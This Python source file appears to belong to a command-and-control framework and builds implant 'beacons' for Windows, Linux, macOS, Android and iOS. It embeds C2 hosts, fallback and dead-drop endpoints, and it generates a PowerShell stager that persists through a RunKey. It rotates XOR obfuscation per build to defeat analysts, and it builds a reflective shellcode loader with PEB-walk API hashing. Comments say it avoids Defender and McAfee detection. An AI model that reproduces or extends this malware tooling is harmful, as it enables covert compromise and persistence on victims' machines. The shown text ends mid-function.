import os
import re
import secrets
import shutil
import base64
import struct
import subprocess
import sys
from typing import List, Optional
from rich.console import Console
from phantom.utils.notifier import notifier
from phantom.utils.build_helper import check_build_env
from phantom.utils.c2_crypto import write_beacon_crypto_config, write_beacon_c2_config, crypto_fingerprint
from phantom.utils.network import beacon_pin, beacon_pubkey_pin
from phantom.utils.beacon_auth import write_beacon_auth_config
from phantom.utils.malleable import write_malleable_config

console = Console()

_XOR_KEY = 0xAA

_PLATFORM_OUT = {
    "windows": "beacon.exe",
    "linux": "beacon_linux",
    "macos": "beacon_macos",
    "android": "beacon_android",
    # iOS: a dylib injected into an MDM-pushed, enterprise-signed app; a
    # standalone Mach-O cannot execute on a non-jailbroken device. Builds
    # only on macOS + Xcode (see check_build_env), delivered via MDM.
    "ios": "beacon_ios.dylib",
    "linux32": "beacon_linux_x86",
}


def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
    """Return True if binary is missing or crypto keys changed since last build."""
    beacon_out = os.path.join(beacon_dir, out_name)
    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
    if not os.path.exists(beacon_out):
        return True
    current = crypto_fingerprint()
    if not os.path.exists(hash_file):
        return True
    try:
        with open(hash_file, "r", encoding="utf-8") as f:
            return f.read().strip() != current
    except OSError:
        return True


def _mark_built(beacon_dir: str, out_name: str) -> None:
    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
    with open(hash_file, "w", encoding="utf-8") as f:
        f.write(crypto_fingerprint())


def _xor_encrypt(data: bytes, key: int = _XOR_KEY) -> bytes:
    return bytes(b ^ key for b in data)


def _ror13_hash(name: str) -> int:
    h = 0
    for c in name.upper():
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h


def _rva_to_fileoff(pe: bytes, rva: int, sect_hdr_off: int, num_sects: int) -> Optional[int]:
    """Convert an RVA to a file offset by walking section headers."""
    for si in range(num_sects):
        so = sect_hdr_off + si * 40
        va = struct.unpack_from('<I', pe, so + 12)[0]
        vs = struct.unpack_from('<I', pe, so + 8)[0]
        rp = struct.unpack_from('<I', pe, so + 20)[0]
        if va <= rva < va + vs:
            return rp + (rva - va)
    return None


def _get_virtualalloc_rva(kernel32_path: str) -> Optional[int]:
    """Return the RVA of VirtualAlloc in a given kernel32.dll."""
    try:
        with open(kernel32_path, 'rb') as f:
            pe = f.read()
        if pe[:2] != b'MZ':
            return None
        e_lfanew = struct.unpack_from('<I', pe, 0x3C)[0]
        if pe[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
            return None
        # COFF header starts at e_lfanew + 4
        _coff = e_lfanew + 4
        opt_hdr = _coff + 20
        magic = struct.unpack_from('<H', pe, opt_hdr)[0]
        is_64 = magic == 0x20B
        # Data directory array: PE32+ = opt_hdr + 0x70, PE32 = opt_hdr + 0x60
        # Export directory is entry [0] → opt_hdr + (0x70 if is_64 else 0x60)
        export_dir_rva = struct.unpack_from('<I', pe, opt_hdr + (0x70 if is_64 else 0x60))[0]
        if export_dir_rva == 0:
            return None

        num_sects = struct.unpack_from('<H', pe, _coff + 2)[0]
        opt_hdr_sz = struct.unpack_from('<H', pe, _coff + 16)[0]
        sect_hdr_off = opt_hdr + opt_hdr_sz

        exp_fo = _rva_to_fileoff(pe, export_dir_rva, sect_hdr_off, num_sects)
        if exp_fo is None:
            return None

        exp = pe[exp_fo:]
        num_names = struct.unpack_from('<I', exp, 0x18)[0]
        addr_of_names = struct.unpack_from('<I', exp, 0x20)[0]
        addr_of_funcs = struct.unpack_from('<I', exp, 0x1C)[0]
        addr_of_ords = struct.unpack_from('<I', exp, 0x24)[0]

        target_hash = _ror13_hash("VirtualAlloc")
        for i in range(num_names):
            name_rva = struct.unpack_from('<I', pe,
                _rva_to_fileoff(pe, addr_of_names, sect_hdr_off, num_sects) + i * 4)[0]
            name_fo = _rva_to_fileoff(pe, name_rva, sect_hdr_off, num_sects)
            if name_fo is None:
                continue
            name = pe[name_fo:pe.find(b'\x00', name_fo)].decode('ascii', errors='replace')
            if _ror13_hash(name) == target_hash:
                ord_fo = _rva_to_fileoff(pe, addr_of_ords, sect_hdr_off, num_sects)
                funcs_fo = _rva_to_fileoff(pe, addr_of_funcs, sect_hdr_off, num_sects)
                if ord_fo is None or funcs_fo is None:
                    return None
                ord_idx = struct.unpack_from('<H', pe, ord_fo + i * 2)[0]
                func_rva = struct.unpack_from('<I', pe, funcs_fo + ord_idx * 4)[0]
                return func_rva
        return None
    except Exception:
        return None


def _write_config_seed(beacon_dir: str) -> str:
    """Rotate the compile-time XOR seed in ``config_encrypted.h`` per build.

    C2_HOST/C2_PORT are XOR-obfuscated with a keystream derived from
    CONFIG_SEED. The header documented per-build rotation, but nothing
    generated it — every binary shipped the same hardcoded seed, so an
    analyst could decrypt the config of ANY build. A fresh random seed per
    build gives every binary a different keystream.
    """
    src_dir = os.path.join(beacon_dir, "src")
    path = os.path.join(src_dir, "config_encrypted.h")
    try:
        with open(path, "r", encoding="utf-8") as handle:
            content = handle.read()
    except OSError:
        return path
    seed = secrets.randbits(64)
    new_content, count = re.subn(
        r"constexpr uint64_t CONFIG_SEED = 0x[0-9A-Fa-f]+ULL;",
        f"constexpr uint64_t CONFIG_SEED = 0x{seed:016X}ULL;",
        content, count=1)
    if count == 1:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(new_content)
    return path


def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                   arch: str = "x64", disable_anti: bool = False,
                   host: str = "127.0.0.1", port: int = 8080,
                   use_ssl: bool = True,
                   malleable_profile: Optional[str] = None,
                   hosts: Optional[List[str]] = None,
                   proxy: str = "") -> Optional[str]:
    """
    Compiles the C++ beacon for the specified platform and architecture.
    Embeds C2 keys and enrolls a unique per-beacon HMAC identity at build time.
    When PHANTOM_MTLS_REQUIRED=1, client certificate material and the pinned
    server fingerprint are generated into the protected build artifact.

    `hosts` is the FALLBACK ladder behind `host` (from PHANTOM_C2_FALLBACK /
    `c2.fallback` when not passed explicitly) and `proxy` an explicit proxy
    URL (PHANTOM_C2_PROXY / `c2.proxy`); both are embedded so a filtered
    endpoint or a proxy-only network does not cost the engagement.
    Returns the path to the compiled binary or None on failure.
    """
    if hosts is None or not proxy:
        try:
            from phantom.utils.network import get_c2_fallbacks, get_c2_proxy
            if hosts is None:
                hosts = get_c2_fallbacks()
            if not proxy:
                proxy = get_c2_proxy()
        except Exception:
            hosts = hosts or []
    # PER-ENDPOINT PINS: each rung of the ladder may present its own
    # certificate, so `c2.pins` / `c2.pubkey_pins` carry one pin per rung
    # (positionally aligned with [primary] + fallbacks); empty = [].
    try:
        from phantom.utils.network import get_c2_host_pins, get_c2_pubkey_pins
        host_pins = get_c2_host_pins()
        pubkey_pins = get_c2_pubkey_pins()
    except Exception:
        host_pins, pubkey_pins = [], []
    # LAST-RING dead drop: the URL the beacon falls back to only when every
    # ladder rung failed. Read from config here so a build always embeds the
    # operator's current dead drop (no separate flag to forget).
    try:
        from phantom.utils.dead_drop import configured_url
        dead_drop = configured_url()
    except Exception:
        dead_drop = ""
    if not check_build_env(platform, arch):
        notifier.error(f"Build environment not ready for {platform} ({arch}).")
        return None

    beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
    
    # Cleanup any existing beacon process to prevent "Permission denied"
    # Scoped: only processes started from THIS beacon directory are killed,
    # never unrelated beacon.exe on the operator host.
    if os.name == 'nt':
        beacon_exe = os.path.join(beacon_dir, _PLATFORM_OUT.get("windows", "beacon.exe"))
        subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"Get-Process -Name beacon -ErrorAction SilentlyContinue | Where-Object {{ $_.Path -eq '{beacon_exe}' }} | Stop-Process -Force"],
            capture_output=True, timeout=30)
    
    # Architecture-aware output name
    if platform == "linux" and arch == "x86":
        out_name = _PLATFORM_OUT["linux32"]
    else:
        out_name = _PLATFORM_OUT.get(platform)
        
    if not out_name:
        notifier.error(f"Unknown platform: {platform}")
        return None

    beacon_out = os.path.join(beacon_dir, out_name)

    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name):
        return beacon_out

    # Generate dynamic build ID to ensure unique binary hash
    import uuid
    build_id_path = os.path.join(beacon_dir, "src", "build_id.h")
    with open(build_id_path, "w") as f:
        f.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')

    # Enroll a unique identity for every explicit build. The private secret
    # is written only to the generated header and the operator registry.
    write_beacon_auth_config(beacon_dir)
    # payload_token="": the identity enrolled just above derives its own
    # download token at runtime. Burning the deployment token into every
    # binary handed an analyst who captures one beacon the key to fetch every
    # payload, forever.
    write_beacon_crypto_config(beacon_dir, payload_token="")
    # No-disk persistence: embed the compact PowerShell stager so the
    # beacon's `persist` command writes a RunKey that relaunches the
    # in-memory path at logon (field-verified: the on-disk PE gets
    # execution-blocked by McAfee even when the file itself survives).
    ps_stager_b64 = ""
    try:
        # ONE-SHOT on purpose: this blob is re-run by the beacon's own
        # `persist` (RunKey at logon). Wrapping it resilient would schedule a
        # SECOND persistence (a schtasks task) on top of the RunKey.
        _drop = generate_dropper(
            "windows", host, str(port), dl_port=port, use_ssl=use_ssl,
            resilient=False)
        if _drop and " -Enc " in _drop:
            ps_stager_b64 = _drop.rsplit(" -Enc ", 1)[1].strip()
    except Exception:
        ps_stager_b64 = ""
    # REDIRECTOR-FIRST GUARDRAIL: a beacon that carries the operator's own
    # listener address hands an analyst who captures it the backend to
    # attack. Warn at BUILD time (doctor reports the same posture) unless a
    # disposable `c2.front` covers the build.
    try:
        from phantom.utils.network import front_guard_reason
        _front_reason = front_guard_reason(host)
        if _front_reason:
            notifier.warn(f"C2 front: {_front_reason}.")
    except Exception:
        pass
    # Dead-drop-first: resolve the live endpoint before the first check-in so
    # the indirection can be rotated without rebuilding (flag in the header).
    try:
        from phantom.utils import config as _cfg
        bootstrap_dd = _cfg.get_bool("c2.bootstrap_dead_drop", True,
                                     env="PHANTOM_C2_DEADDROP_BOOTSTRAP")
    except Exception:
        bootstrap_dd = True
    # PIN SOURCE: a TLS-TERMINATING front presents its OWN certificate, so the
    # pin must be derived from that file (c2.front_cert / certs/front.crt), not
    # the backend's — otherwise every check-in fails once the two differ.
    try:
        from phantom.utils.network import c2_pin_cert_path
        pin_cert = c2_pin_cert_path()
    except Exception:
        pin_cert = ""
    if use_ssl:
        try:
            from phantom.utils.network import c2_pin_cert_path, get_c2_front
            if get_c2_front() and not c2_pin_cert_path():
                notifier.warn(
                    "C2 front: a front is set but no front certificate was "
                    "found — the beacon will pin the BACKEND certificate, "
                    "which a TLS-terminating front does not present. Set "
                    "c2.front_cert or drop certs/front.crt.")
        except Exception:
            pass
    _cert_pin = beacon_pin(pin_cert)
    _pk_pin = beacon_pubkey_pin(pin_cert)
    # A-2: a TLS beacon with NO pin and NO mTLS cannot authenticate the peer,
    # and the runtime now fails closed. Tell the operator at BUILD time so a
    # dead beacon is not discovered later on the target.
    if use_ssl and not _cert_pin and not _pk_pin:
        from phantom.utils.network import _pins_disabled
        if _pins_disabled():
            notifier.warn(
                "C2 pinning is OFF (PHANTOM_BEACON_PIN=0): this beacon will "
                "accept ANY TLS certificate. Only acceptable in a lab.")
        else:
            notifier.warn(
                "HTTPS beacon has no certificate pin: no C2 certificate was "
                "found, so the beacon fails closed and cannot check in. "
                "Generate the listener certificate first, or opt out "
                "explicitly with PHANTOM_BEACON_PIN=0.")
    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl,
                           ps_stager_b64=ps_stager_b64, hosts=list(hosts or []),
                           proxy=proxy or "", pin=_cert_pin,
                           pins=host_pins, pubkey_pin=_pk_pin,
                           pubkey_pins=pubkey_pins,
                           dead_drop=dead_drop or "",
                           bootstrap_dead_drop=bootstrap_dd)
    write_malleable_config(beacon_dir, profile_path=malleable_profile)
    # Fresh XOR keystream per build so the C2 config never recurs in strings.
    _write_config_seed(beacon_dir)

    if platform == "windows":
        console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
        try:
            asm_files = [
                "src/syscalls.asm",
                "src/pic_bootstrap.asm",
                "src/peb_walker.asm",
                "src/api_resolver.asm",
            ]

            # Helper to find a tool by any of its possible names
            def _find_tool(names, mingw_dir=None):
                for name in names:
                    p = shutil.which(name)
                    if p:
                        return p
                    if mingw_dir:
                        p = os.path.join(mingw_dir, name)
                        if os.path.exists(p):
                            return p
                        # On Windows, tools have .exe extension
                        p_exe = p + ".exe"
                        if os.path.exists(p_exe):
                            return p_exe
                return None

            # Detect toolchain: prefer x86_64-w64-mingw32-*, fall back to short names
            if arch == "x64":
                mingw_prefix = "x86_64-w64-mingw32-"
            else:
                mingw_prefix = "i686-w64-mingw32-"

            mingw_cpp = _find_tool([f"{mingw_prefix}g++", "g++"])
            if not mingw_cpp:
                notifier.error("No suitable C++ compiler found (x86_64-w64-mingw32-g++ or g++).")
                return None

            mingw_bin_dir = os.path.dirname(mingw_cpp)
            mingw_as = _find_tool([f"{mingw_prefix}as", "as"], mingw_bin_dir)
            mingw_objcopy = _find_tool([f"{mingw_prefix}objcopy", "objcopy"], mingw_bin_dir)

            if not mingw_as:
                notifier.error("Assembler (as) not found in mingw toolchain.")
                return None
            if not mingw_objcopy:
                notifier.error("objcopy not found in mingw toolchain.")
                return None

            # Ensure mingw bin directory is in PATH for subprocess calls (needed for DLL dependencies)
            build_env = os.environ.copy()
            build_env["PATH"] = mingw_bin_dir + os.pathsep + build_env["PATH"]

            # Assemble all .asm -> .o in beacon_dir (object files are not scanned by Defender RTM)
            objs = []
            as_flags = ["--64"] if arch == "x64" else ["--32"]
            for af in asm_files:
                obj = af.replace(".asm", ".o")
                obj_path = os.path.join(beacon_dir, obj)
                asm_path = os.path.normpath(os.path.join(beacon_dir, af))
                console.print(f"[blue]  Assembling: {af} -> {obj}[/blue]")
                result = subprocess.run([mingw_as, *as_flags, asm_path, "-o", obj_path], capture_output=True, text=True, env=build_env, timeout=300)
                if result.returncode != 0:
                    console.print(f"[red]  Assembler failed (exit {result.returncode}):[/red]")
                    console.print(f"[red]  stdout: {result.stdout}[/red]")
                    console.print(f"[red]  stderr: {result.stderr}[/red]")
                    raise subprocess.CalledProcessError(result.returncode, [mingw_as])
                objs.append(obj)

            import time
            build_time = str(int(time.time()))

            # ── OPSEC: isolate PE intermediate in TEMP directory ──────────────
            # CRT requires PE format for imports/relocations; --oformat binary
            # fails with "cannot perform PE operations on non PE output file".
            # Solution: link PE in a randomized %TEMP% subfolder, extract .bin
            # via objcopy, then immediately delete the PE. Only beacon.bin
            # (raw shellcode) is copied to the project directory.
            import uuid
            temp_build_id = uuid.uuid4().hex[:12]
            temp_build_dir = os.path.join(os.environ.get("TEMP", os.environ.get("TMP", os.path.expanduser("~"))),
                                          f"pbc_{temp_build_id}")
            os.makedirs(temp_build_dir, exist_ok=True)

            temp_pe = os.path.join(temp_build_dir, "beacon.exe.tmp")
            temp_full_bin = os.path.join(temp_build_dir, "beacon_full.bin.tmp")
            temp_map = os.path.join(temp_build_dir, "beacon.map")

            # Build source list with absolute paths for TEMP dir linking
            main_cpp = os.path.join(beacon_dir, "src", "main.cpp")
            obj_paths = [os.path.join(beacon_dir, o) for o in objs]

            try:
                # First pass: link with map file to extract beacon_main RVA
                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-fno-omit-frame-pointer", "-D_BUILD_TIME=" + build_time]
                if disable_anti:
                    cmd.append("-DDISABLE_ANTI")
                cmd += ["-o", temp_pe,
                       f"-I{os.path.join(beacon_dir, 'src')}", main_cpp,                           f"-Wl,-e,_start,-Map,{temp_map}"] + obj_paths + ["-lwinhttp", "-lbcrypt", "-lws2_32", "-lbthprops", "-lwlanapi", "-lgdi32", "-luser32", "-lgdiplus", "-lole32", "-liphlpapi", "-lcrypt32", "-static", "-mwindows"]

                console.print(f"[blue]  Linking PE in TEMP ({temp_build_dir})...[/blue]")
                result = subprocess.run(cmd, capture_output=True, text=True, env=build_env, timeout=600)
                if result.returncode != 0:
                    console.print(f"[red]Compilation failed:\n{result.stderr}[/red]")
                    return None

                import struct as _st
                import re

                # Extract beacon_main RVA from map file
                bm_rva = None
                if os.path.exists(temp_map):
                    with open(temp_map, encoding='utf-8') as mf:
                        for line in mf:
                            m = re.match(r'^\s+0x([0-9a-fA-F]+)\s+beacon_main$', line)
                            if m:
                                abs_addr = int(m.group(1), 16)
                                with open(temp_pe, 'rb') as pf:
                                    pe_bytes = pf.read()
                                e_lfanew = _st.unpack_from('<I', pe_bytes, 0x3C)[0]
                                opt = e_lfanew + 24
                                magic = _st.unpack_from('<H', pe_bytes, opt)[0]
                                if magic == 0x20B:
                                    img_base = _st.unpack_from('<Q', pe_bytes, opt + 24)[0]
                                else:
                                    img_base = _st.unpack_from('<I', pe_bytes, opt + 24)[0]
                                bm_rva = abs_addr - img_base
                                console.print(f"[green][+] beacon_main RVA: 0x{bm_rva:x}[/green]")
                                break

                # Extract raw binary via objcopy
                console.print(f"[blue]  Extracting raw binary via objcopy...[/blue]")
                subprocess.run([mingw_objcopy, "-O", "binary", temp_pe, temp_full_bin],
                               check=True, capture_output=True, text=True, env=build_env, timeout=300)

                # Trim CRT prefix so _start is at offset 0
                with open(temp_pe, 'rb') as f:
                    pe_data = f.read()
                e_lfanew = _st.unpack_from('<I', pe_data, 0x3C)[0]
                nt = e_lfanew
                opt_hdr = nt + 4 + 20
                ep_rva = _st.unpack_from('<I', pe_data, opt_hdr + 16)[0]
                num_sections = _st.unpack_from('<H', pe_data, nt + 4 + 2)[0]
                opt_hdr_sz = _st.unpack_from('<H', pe_data, nt + 4 + 16)[0]
                sect_hdr = opt_hdr + opt_hdr_sz
                first_section_vma = _st.unpack_from('<I', pe_data, sect_hdr + 12)[0]
                start_offset = ep_rva - first_section_vma

                bin_name = out_name.replace('.exe', '.bin')
                beacon_bin = os.path.join(beacon_dir, bin_name)
                with open(temp_full_bin, 'rb') as f:
                    raw = f.read()
                # Save the full PE (for reference / debugging only — not used by PIC path)
                beacon_pe = os.path.join(beacon_dir, "beacon.pe")
                shutil.copy2(temp_pe, beacon_pe)
                console.print(f"[green][+] PE (reference): {beacon_pe} ({os.path.getsize(beacon_pe)} bytes)[/green]")

                with open(beacon_bin, 'wb') as f:
                    f.write(raw[start_offset:])
                console.print(f"[green][+] Shellcode .bin: {beacon_bin} ({len(raw)-start_offset} bytes, entry @ +0x0)[/green]")

                # ── XOR-encrypt beacon.bin for the ultra-compact PowerShell stager ──
                beacon_xored = os.path.join(beacon_dir, "beacon_xored.bin")
                with open(beacon_bin, 'rb') as f:
                    plain = f.read()
                xored = _xor_encrypt(plain, _XOR_KEY)
                with open(beacon_xored, 'wb') as f:
                    f.write(xored)
                console.print(f"[green][+] XOR-encrypted .bin: {beacon_xored} ({len(xored)} bytes)[/green]")

                # ── Build reflective loader and combine with full PE ──
                # The loader prepends a PIC shellcode that:
                #   1. PEB walks to find kernel32
                #   2. Resolves VirtualAlloc/LoadLibraryA/GetProcAddress
                #   3. Parses the appended beacon PE
                #   4. Maps sections, resolves imports, applies relocations
                #   5. Calls the beacon entry point
                console.print(f"[blue]  Building reflective loader...[/blue]")

                mingw_cc = _find_tool([f"{mingw_prefix}gcc", "gcc"], mingw_bin_dir)

                # Assemble bootstrap (PEB walk + C function call)
                rl_bootstrap_asm = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.asm")
                rl_bootstrap_o = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.o")
                r = subprocess.run([mingw_as, "--64", rl_bootstrap_asm, "-o", rl_bootstrap_o],
                    capture_output=True, text=True, env=build_env, timeout=300)
                if r.returncode != 0:
                    console.print(f"[red]  RL asm failed: {r.stderr}[/red]")
                    return None

                # Compile C core (PE parsing, import resolution, relocation)
                rl_c_src = os.path.join(beacon_dir, "src", "reflective_loader.c")
                rl_c_o = os.path.join(beacon_dir, "src", "reflective_loader.o")
                r = subprocess.run([mingw_cc, "-c", "-O2", "-fPIC", "-nostdlib", "-ffreestanding",
                    "-fno-stack-protector", rl_c_src, "-o", rl_c_o],
                    capture_output=True, text=True, env=build_env, timeout=300)
                if r.returncode != 0:
                    console.print(f"[red]  RL C failed: {r.stderr}[/red]")
                    return None

                # Link as standalone PE
                rl_exe = os.path.join(beacon_dir, "reflective_loader.exe")
                r = subprocess.run([mingw_cc, "-nostdlib", "-nostartfiles",
                    "-Wl,-e,_reflective_loader_entry", "-Wl,--subsystem,windows",
                    "-o", rl_exe, rl_bootstrap_o, rl_c_o],
                    capture_output=True, text=True, env=build_env, timeout=300)
                if r.returncode != 0:
                    console.print(f"[red]  RL link failed: {r.stderr}[/red]")
                    return None

                # Extract as raw binary
                rl_bin = os.path.join(beacon_dir, "reflective_loader.bin")
                r = subprocess.run([mingw_objcopy, "-O", "binary", rl_exe, rl_bin],
                    capture_output=True, text=True, env=build_env, timeout=300)
                if r.returncode != 0:
                    console.print(f"[red]  RL objcopy failed: {r.stderr}[/red]")
                    return None

                # Patch config structure in loader binary
                with open(rl_bin, 'rb') as f:
                    loader_data = bytearray(f.read())
                MARKER_MAGIC = b'\xAA\xBB\xCC\xDD'
                marker_pos = loader_data.find(MARKER_MAGIC)
                if marker_pos < 0:
                    console.print(f"[red]  RL marker not found in loader binary![/red]")
                    return None
                dll_offset = len(loader_data)
                struct.pack_into('<Q', loader_data, marker_pos + 4, dll_offset)
                bm_rva_val = bm_rva if bm_rva is not None else 0
                struct.pack_into('<Q', loader_data, marker_pos + 12, bm_rva_val)
                console.print(f"[green][+] Config: DLL offset 0x{dll_offset:x}, beacon_main RVA 0x{bm_rva_val:x}[/green]")

                # Read full PE (saved as beacon.pe earlier)
                with open(beacon_pe, 'rb') as f:
                    pe_data = f.read()

                # Combine loader + full PE, XOR-encrypt, overwrite beacon_xored.bin
                combined = bytes(loader_data) + pe_data
                combined_xored = _xor_encrypt(combined, _XOR_KEY)
                with open(beacon_xored, 'wb') as f:
                    f.write(combined_xored)
                console.print(f"[green][+] Combined loader+PE XOR payload: {len(combined_xored)} bytes[/green]")

                # ── Detect VirtualAlloc RVA from local kernel32 ──
                va_rva = None
                if platform == "windows":
                    # Try to find kernel32.dll on the build system
                    kernel32_paths = [
                        r"C:\Windows\System32\kernel32.dll",
                        os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "kernel32.dll"),
                        os.path.join(beacon_dir, "..", "..", "..", "kernel32.dll.bin"),
                        os.path.join(pkg_root, "kernel32.dll.bin"),
                        "/app/kernel32.dll.bin",
                    ]
                    for kp in kernel32_paths:
                        if os.path.exists(kp):
                            va_rva = _get_virtualalloc_rva(kp)
                            if va_rva is not None:
                                console.print(f"[green][+] VirtualAlloc RVA: 0x{va_rva:x}[/green]")
                                break
                beacon_rva_file = os.path.join(beacon_dir, "beacon.rva")
                with open(beacon_rva_file, 'w') as rvf:
                    rvf.write(f"0x{va_rva:x}\n" if va_rva is not None else "0x1C7F0\n")
                console.print(f"[green][+] VirtualAlloc RVA saved: {beacon_rva_file}[/green]")
            finally:
                # Wipe PE + intermediate .bin from TEMP directory (Defender RTM blind spot)
                for f in [temp_pe, temp_full_bin]:
                    try:
                        if os.path.exists(f):
                            os.remove(f)
                    except OSError:
                        pass
                try:
                    os.rmdir(temp_build_dir)
                except OSError:
                    pass

            _mark_built(beacon_dir, out_name)
            return beacon_bin
        except subprocess.CalledProcessError as e:
            notifier.error(f"Windows compilation failed:\n{e.stderr}")
            return None

    elif platform == "linux":
        console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
        try:
            static_name = "beacon_linux_static"

            def _wsl_path(p: str) -> str:
                p = os.path.abspath(p)
                drive, rest = p[0].lower(), p[2:].replace("\\", "/")
                return f"/mnt/{drive}{rest}"

            def _build_cmd(static: bool) -> list:
                if static:
                    base = ["g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
                            "-o", static_name, "-Isrc", "src/main.cpp",
                            "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"]
                else:
                    base = ["g++", "-std=c++20", "-O2", "-s",
                            "-o", out_name, "-Isrc", "src/main.cpp",
                            "-lssl", "-lcrypto", "-lpthread", "-ldl"]
                    if arch == "x86":
                        base.insert(1, "-m32")
                return base

            # Windows host: compile INSIDE the Kali WSL distro — its g++ has
            # the Linux headers and static libs the MinGW toolchain lacks.
            wsl_prefix: list = []
            wsl_dir = ""
            if os.name == "nt":
                from phantom.utils.build_helper import _wsl_cmd
                wsl_prefix = _wsl_cmd(["true"])
                if wsl_prefix:
                    wsl_prefix = wsl_prefix[:-1]   # drop the trailing 'true'
                    wsl_dir = _wsl_path(beacon_dir)

            def _run(cmd: list) -> None:
                if wsl_prefix:
                    fixed = []
                    skip = False
                    for part in cmd:
                        if skip:
                            fixed.append(f"{wsl_dir}/{part}")
                            skip = False
                        elif part == "-o":
                            fixed.append(part)
                            skip = True
                        elif part == "-Isrc":
                            fixed.append(f"-I{wsl_dir}/src")
                        elif part == "src/main.cpp":
                            fixed.append(f"{wsl_dir}/src/main.cpp")
                        else:
                            fixed.append(part)
                    subprocess.run(wsl_prefix + fixed, check=True,
                                   capture_output=True, text=True, timeout=600)
                else:
                    subprocess.run(cmd, cwd=beacon_dir, check=True,
                                   capture_output=True, text=True, timeout=600)

            _run(_build_cmd(static=False))
            _mark_built(beacon_dir, out_name)

            # Static + XOR'd inject payload (deploy artifact)
            static_path = os.path.join(beacon_dir, static_name)
            try:
                _run(_build_cmd(static=True))

                xored_path = os.path.join(beacon_dir, "beacon_linux_xored.bin")
                with open(static_path, "rb") as f:
                    data = f.read()
                xored = bytes(b ^ _XOR_KEY for b in data)
                with open(xored_path, "wb") as f:
                    f.write(xored)

                # keep beacon_linux_static: the auto-mode Linux deploy (scp
                # + setsid) stages the STATIC binary — the dynamic one dies
                # with GLIBC_2.38 on older distros (Debian bookworm, ...)
                raw_path = os.path.join(beacon_dir, "beacon_linux_raw.bin")
                if os.path.exists(raw_path):
                    os.unlink(raw_path)

                console.print(f"[green][+] XOR-encrypted inject payload: {xored_path} ({len(xored)} bytes)[/green]")
            except Exception as static_err:
                console.print(f"[yellow][!] Static inject payload not built: {static_err}[/yellow]")

            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Linux compilation failed:\n{e.stderr}")
            return None

    elif platform == "macos":
        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
        # On a REAL Mac osxcross does not exist and is not needed: the system
        # clang++ builds the payload directly. Without this branch a macOS
        # operator could not produce a macOS beacon at all — which made the
        # cross-platform promise land on Linux/Windows in practice.
        native = sys.platform == "darwin" and not os.path.exists(o32_cc)
        if native:
            console.print("[yellow][*] Compiling beacon for macOS (native clang++)...[/yellow]")
        else:
            console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
            if not os.path.exists(o32_cc):
                notifier.error(f"osxcross compiler not found at {o32_cc} "
                               f"(on macOS the system clang++ is used "
                               f"instead)")
                return None
        try:
            include_flags = ["-Isrc"]
            link_flags = ["-lcurl", "-lssl", "-lcrypto", "-lpthread"]
            compiler = o32_cc
            if native:
                compiler = os.environ.get("CXX") or "clang++"
                # Homebrew's OpenSSL is keg-only: without these the compile
                # stops at a missing <openssl/evp.h>.
                openssl_prefix = os.environ.get("OPENSSL_PREFIX", "").strip()
                if not openssl_prefix:
                    try:
                        openssl_prefix = subprocess.run(
                            ["brew", "--prefix", "openssl@3"],
                            capture_output=True, text=True, timeout=30,
                        ).stdout.strip()
                    except Exception:
                        openssl_prefix = ""
                if openssl_prefix and os.path.isdir(openssl_prefix):
                    include_flags.append(f"-I{openssl_prefix}/include")
                    link_flags.insert(0, f"-L{openssl_prefix}/lib")
                else:
                    notifier.warn("OpenSSL prefix not found; set "
                                  "OPENSSL_PREFIX if the build fails.")
            else:
                sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
                if os.path.exists(sdk_path):
                    include_flags.append(f"-isysroot{sdk_path}")

            subprocess.run(
                [compiler, "-std=c++20", "-O2", "-o", "beacon_macos",
                 *include_flags, "src/main.cpp", *link_flags],
                cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"macOS compilation failed:\n{e.stderr}")
            return None

    elif platform == "ios":
        # check_build_env() already enforced macOS + Xcode + iOS SDK. The
        # implant is a dylib: on a non-jailbroken device it only runs when
        # loaded inside an enterprise-signed app pushed by MDM.
        console.print("[yellow][*] Compiling beacon for iOS (dylib, "
                      "arm64)...[/yellow]")
        dev_sdk = os.environ.get(
            "IOS_DEV_SDK",
            "/Applications/Xcode.app/Contents/Developer/Platforms/"
            "iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk")
        if not os.path.isdir(dev_sdk):
            try:
                dev_sdk = subprocess.run(
                    ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"],
                    capture_output=True, text=True, timeout=30).stdout.strip()
            except Exception:
                dev_sdk = ""
        if not dev_sdk or not os.path.isdir(dev_sdk):
            notifier.error("iOS SDK path not found (set IOS_DEV_SDK).")
            return None
        try:
            subprocess.run(
                ["xcrun", "-sdk", "iphoneos", "clang++", "-std=c++20",
                 "-O2", "-fPIC", "-shared", "-dynamiclib", "-arch", "arm64",
                 "-o", out_name,
                 "-Isrc", "src/main.cpp",
                 f"-isysroot{dev_sdk}",
                 "-framework", "Foundation", "-framework", "Security",
                 "-lssl", "-lcrypto"],
                cwd=beacon_dir, check=True, capture_output=True, text=True,
                timeout=1200)
            _mark_built(beacon_dir, out_name)
